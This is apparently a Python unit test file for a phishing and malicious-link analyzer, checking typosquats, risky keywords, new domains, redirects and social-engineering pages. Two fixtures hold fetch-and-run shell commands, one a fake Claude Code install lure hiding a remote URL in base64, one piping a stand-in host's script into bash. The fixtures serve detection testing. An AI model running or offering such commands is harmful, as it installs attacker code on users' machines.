import unittest
from unittest.mock import patch

from link_check.analyzer import analyze_text, analyze_url, check_similarity


class AnalyzerTests(unittest.TestCase):
    def test_similarity_flags_typosquat(self):
        self.assertEqual(check_similarity("goggle.com"), "google.com")
        self.assertEqual(check_similarity("openaii.com"), "openai.com")

    def test_similarity_ignores_exact_legit_domain(self):
        self.assertIsNone(check_similarity("google.com"))

    def test_safe_url_has_low_score(self):
        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
            "link_check.analyzer.check_redirect", return_value=(False, [])
        ), patch("link_check.analyzer.fetch_url_text", return_value=None):
            result = analyze_url("https://google.com")

        self.assertEqual(result["score"], 0)
        self.assertEqual(result["reasons"], ["No obvious issues detected"])
        self.assertEqual(result["domain"], "google.com")

    def test_keyword_and_tld_increase_score(self):
        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
            "link_check.analyzer.check_redirect", return_value=(False, [])
        ), patch("link_check.analyzer.fetch_url_text", return_value=None):
            result = analyze_url("https://secure-login-example.xyz")

        self.assertEqual(result["score"], 40)
        self.assertIn('Contains risky keyword: "secure"', result["reasons"])
        self.assertIn('Contains risky keyword: "login"', result["reasons"])
        self.assertIn("Suspicious TLD: .xyz", result["reasons"])

    def test_new_domain_increases_score(self):
        with patch("link_check.analyzer.get_domain_age", return_value=3), patch(
            "link_check.analyzer.check_redirect", return_value=(False, [])
        ), patch("link_check.analyzer.fetch_url_text", return_value=None):
            result = analyze_url("https://example.com")

        self.assertEqual(result["score"], 30)
        self.assertIn("Very new domain (3 days)", result["reasons"])

    def test_redirect_chain_is_reported(self):
        chain = ["https://a.test", "https://b.test"]
        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
            "link_check.analyzer.check_redirect", return_value=(True, chain)
        ), patch("link_check.analyzer.fetch_url_text", return_value=None):
            result = analyze_url("https://example.com")

        self.assertEqual(result["score"], 15)
        self.assertIn("Multiple redirects detected", result["reasons"])
        self.assertEqual(result["redirect_chain"], chain)

    def test_social_engineering_detects_obfuscated_install_command(self):
        content = """
        How to Install Claude Code on macOS
        Is it safe? Yes, if you use only the official claude.ai script.
        Copy the command below:
        curl -kfsSL $(echo 'aHR0cDovL29ha2xhbmR3YXRlcmRhbWFnZS5jb20vY3VybC82NjQ1YmY2MWJkNWM2OWQ4NjkyYzVjN2Q0NTIxYWY2MTQzMTU4ZDI1ZDBiMWI3ZGQyMTNlZjk3NTc2MDJiMzlh'|base64 -D)|zsh
        """

        result = analyze_text(content, source_domain="claude.ai")

        self.assertEqual(result["score"], 100)
        self.assertIn(
            "Social engineering: install command pipes remote script into shell",
            result["reasons"],
        )
        self.assertIn(
            "Social engineering: obfuscated base64 payload hides a URL",
            result["reasons"],
        )
        self.assertIn(
            "Social engineering: install command downloads from untrusted domain: oaklandwaterdamage.com",
            result["reasons"],
        )

    def test_analyze_url_adds_fetched_content_signals(self):
        content = "curl -fsSL http://evil.example/install.sh | bash"

        with patch("link_check.analyzer.get_domain_age", return_value=None), patch(
            "link_check.analyzer.check_redirect", return_value=(False, [])
        ), patch("link_check.analyzer.fetch_url_text", return_value=content):
            result = analyze_url("https://claude.ai/share/example")

        self.assertGreaterEqual(result["score"], 70)
        self.assertIn(
            "Social engineering: install command pipes remote script into shell",
            result["reasons"],
        )


if __name__ == "__main__":
    unittest.main()
